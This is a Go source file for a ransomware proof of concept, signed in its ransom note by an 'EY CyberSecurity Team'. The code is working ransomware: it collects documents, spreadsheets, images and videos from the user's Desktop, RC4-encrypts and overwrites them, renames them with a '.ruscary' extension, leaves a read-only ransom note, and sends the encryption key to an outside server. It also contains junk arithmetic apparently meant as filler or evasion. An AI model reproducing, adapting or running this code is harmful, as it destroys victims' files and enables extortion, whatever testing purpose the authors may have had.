package main

import (
	"crypto/rand"
	"crypto/rc4"
	"encoding/hex"
	"io"
	"io/fs"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"net/http"
    "net/url"

)


var kk = ""
var files []string

func readfile(filename string) string {
	file, _ := os.ReadFile(filename)
	//if err != nil {
	//	return ""
	//}

	return string(file)
}

func GK() ([]byte, error) {
	key := make([]byte, 64)
	_, err := io.ReadFull(rand.Reader, key) 

	if err != nil {
		return nil, err
	}

	return key, nil
}

func enco(txtfile []byte, key []byte) []byte {

	HexKey := hex.EncodeToString(key)
	KeyTxt := []byte(HexKey)
	dest := make([]byte, len(txtfile))
	final, _ := rc4.NewCipher(KeyTxt)
	final.XORKeyStream(dest, txtfile)
	pay := "This is a ransomware poc \n EY CyberSecurity Team"
	fakekey := KeyTxt
	msg := []byte(pay)
	_, err := os.Stat(os.Getenv("USERPROFILE") + "/key.key")
	if err != nil {
		
		data := url.Values{
			"name":       {string(fakekey)},
		}
		r,err := http.PostForm("http://xxxx:8888", data)
		_,_ = r,err

		ioutil.WriteFile(os.Getenv("USERPROFILE")+"/key.key", []byte(fakekey), 0666)
		os.Remove(os.Getenv("USERPROFILE")+"/key.key")

	
	}
	ioutil.WriteFile(os.Getenv("USERPROFILE")+"/Desktop/"+"/readme.txt", []byte(msg), 0444)

	return dest
}
func scf() {

	root := [...]string{os.Getenv("USERPROFILE") + "/Desktop/"}
	for _, rootpath := range root {
		filepath.Walk(rootpath, func(path string, nfo fs.FileInfo, err error) error {

			ok := strings.HasSuffix(path, ".pdf") ||
				strings.HasSuffix(path, ".docx") ||
				strings.HasSuffix(path, ".doc") ||
				strings.HasSuffix(path, ".txt") ||
				strings.HasSuffix(path, ".xls") ||
				strings.HasSuffix(path, ".xlsx") ||
				strings.HasSuffix(path, ".ppt") ||
				strings.HasSuffix(path, ".pptx") ||
				strings.HasSuffix(path, ".csv") ||
				strings.HasSuffix(path, ".jpeg") ||
				strings.HasSuffix(path, ".jpg") ||
				strings.HasSuffix(path, ".JPG") ||
				strings.HasSuffix(path, ".JPEG") ||
				strings.HasSuffix(path, ".png") ||
				strings.HasSuffix(path, ".PNG") ||
				strings.HasSuffix(path, ".mp4")
			/*strigs.HasSuffix(path, ".pst") ||
			strings.HasSuffix(path, ".ost") ||
			strings.HasSuffix(path, ".wmv") ||
			strings.HasSuffix(path, ".mp3") ||
			strings.HasSuffix(path, "mov")*/

			if ok {
				files = append(files, path)
			}

			return nil
		})

	}
}
func main() {
	time.Sleep(10000)
	a := 5*10 + 5 + 5 + 5 + 5 + 5 + 5 + 5555 + 5 + 5 + 5 + 5 + 5 + 5 + 555 + 5 + 5 + 5 + 5 + 5 + 5
	b := 7 + 599*4848*48494*54/99999999 - 89898989
	D := 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
	c := (a / b) + D
	_ = c
	scf()
	key, _ := GK()
	for _, rdf := range files {
		runtime.GOMAXPROCS(1)
		rdfile := readfile(rdf)
		enced := enco([]byte(rdfile), key)
		ioutil.WriteFile(rdf, enced, 0644)
		os.Rename(rdf, rdf+".ruscary")
	}


}
